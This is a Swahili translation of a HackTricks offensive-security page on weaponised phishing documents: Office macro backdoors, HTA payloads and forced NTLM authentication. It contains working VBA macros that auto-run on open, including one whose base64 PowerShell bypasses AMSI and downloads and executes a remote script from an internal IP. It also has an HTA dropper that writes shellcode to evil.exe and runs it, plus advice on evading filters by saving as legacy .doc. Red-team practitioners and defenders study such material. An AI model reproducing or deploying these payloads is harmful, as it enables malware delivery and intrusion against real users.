# Nyaraka za Udukuzi

<details>

<summary><strong>Jifunze udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Nyaraka za Ofisi

Microsoft Word hufanya uthibitishaji wa data ya faili kabla ya kufungua faili. Uthibitishaji wa data hufanywa kwa njia ya kutambua muundo wa data, dhidi ya kiwango cha OfficeOpenXML. Ikiwa kuna kosa lolote wakati wa kutambua muundo wa data, faili inayochambuliwa haitafunguliwa.

Kawaida, faili za Word zinazo macros hutumia kielezo cha `.docm`. Walakini, inawezekana kubadilisha jina la faili kwa kubadilisha kificho cha faili na bado kuweka uwezo wao wa kutekeleza macros.\
Kwa mfano, faili ya RTF haisaidii macros, kwa kubuni, lakini faili ya DOCM iliyebadilishwa jina kuwa RTF itashughulikiwa na Microsoft Word na itaweza kutekeleza macros.\
Mifumo na taratibu sawa inatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint n.k.).

Unaweza kutumia amri ifuatayo kuangalia ni vificho vipi vitatekelezwa na baadhi ya programu za Ofisi:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### Upakiaji wa Picha za Nje

Nenda: _Ingiza --> Vipande vya Haraka --> Uga_\
_**Jamii**: Viungo na Marejeleo, **Jina la Uga**: includePicture, na **Jina la Faili au URL**:_ http://\<ip>/chochote

![](<../../.gitbook/assets/image (152).png>)

### Mlango wa Nyuma wa Macros

Inawezekana kutumia macros kutekeleza nambari za aina yoyote kutoka kwenye hati.

#### Vipengele vya Kiotomatiki

Kadri wanavyokuwa vya kawaida, ndivyo inavyokuwa ya kawaida kwa AV kuzigundua.

* AutoOpen()
* Document\_Open()

#### Mifano ya Nambari za Macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ondoa metadata kwa mkono

Nenda kwa **Faili > Maelezo > Ukaguzi wa Hati > Ukaguzi wa Hatu**, ambayo italeta Mchunguzi wa Hati. Bonyeza **Kagua** kisha **Ondoa Yote** karibu na **Mali za Hati na Taarifa Binafsi**.

#### Uzinduzi wa Hati

Ukishamaliza, chagua **Aina ya Hifadhi** kwenye menyu ya kunjua, badilisha muundo kutoka **`.docx`** hadi **Neno 97-2003 `.doc`**.\
Fanya hivi kwa sababu huwezi kuhifadhi macro ndani ya `.docx` na kuna **unyanyapaa** kuhusu **uzi wa macro ulioziduliwa wa `.docm`** (k.m. ishara ndogo ina alama kubwa ya `!` na baadhi ya lango la wavuti/barua pepe linazuia kabisa). Kwa hivyo, **uzi wa zamani wa `.doc` ni suluhisho bora**.

#### Wazalishaji wa Macro Zenye Nia Mbaya

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Faili za HTA

HTA ni programu ya Windows ambayo **inachanganya HTML na lugha za maandishi (kama VBScript na JScript)**. Inazalisha kiolesura cha mtumiaji na inatekelezwa kama programu "iliyothibitishwa kabisa", bila vizuizi vya mfano wa usalama wa kivinjari.

HTA inatekelezwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **inasakinishwa** pamoja na **Internet Explorer**, ikifanya **`mshta` kuwa tegemezi kwa IE**. Kwa hivyo, ikiwa imeondolewa, HTAs haitaweza kutekelezwa.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Kulazimisha Uthibitisho wa NTLM

Kuna njia kadhaa za **kulazimisha uthibitisho wa NTLM "kijijini"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye barua pepe au HTML ambayo mtumiaji atafikia (hata HTTP MitM?). Au tuma mhanga **anwani ya faili** ambazo zitafanya **uthibitisho** tu kwa **kufungua folda.**

**Angalia mawazo haya na zaidi kwenye kurasa zifuatazo:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM Relay

Usisahau kwamba unaweza kuiba hash au uthibitisho lakini pia **kufanya mashambulizi ya NTLM relay**:

* [**Mashambulizi ya NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (NTLM relay kwa vyeti)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

<details>

<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikionyeshwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **fuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
